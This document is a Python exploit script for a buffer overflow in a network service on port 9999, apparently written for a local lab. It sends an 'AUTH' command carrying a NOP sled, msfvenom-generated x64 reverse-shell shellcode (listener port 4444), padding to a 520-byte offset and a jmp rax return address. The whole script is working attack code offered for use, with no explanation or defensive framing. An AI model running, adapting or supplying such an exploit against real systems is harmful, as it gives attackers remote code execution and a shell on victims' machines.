import socket, struct
target_ip = "127.0.0.1"
target_port = 9999
offset = 520
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x0a\x0d\x2b" -f python
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xe0\x7d\x5e\x1d\xdc"
shellcode += b"\xb4\xc8\x2a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
shellcode += b"\xff\xe2\xf4\x8a\x54\x16\xf9\x92\xbf\x88\x2a\xe0"
shellcode += b"\x7d\x5e\x1d\x94\xf4\x98\x6f\xaa\x35\xd7\x71\xd8"
shellcode += b"\xba\x41\x4c\x8f\x35\x1e\x4b\xcd\xba\x81\x63\xa8"
shellcode += b"\x35\xdd\x6d\xc2\xba\x81\x63\xe8\x35\x85\x30\x94"
shellcode += b"\xfe\x93\x6e\xa9\x2c\xd6\x7c\x5b\xdc\xb4\xc8\x2a"

# Address of jmp rax is e.g. 0x40057e
jmp_rax = struct.pack('<Q', 0x40057e)

nop_sled = b"\x90" * 32
buffer_content = nop_sled + shellcode
padding = b"A" * (offset - len(buffer_content))

payload = b"AUTH " + buffer_content + padding + jmp_rax

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
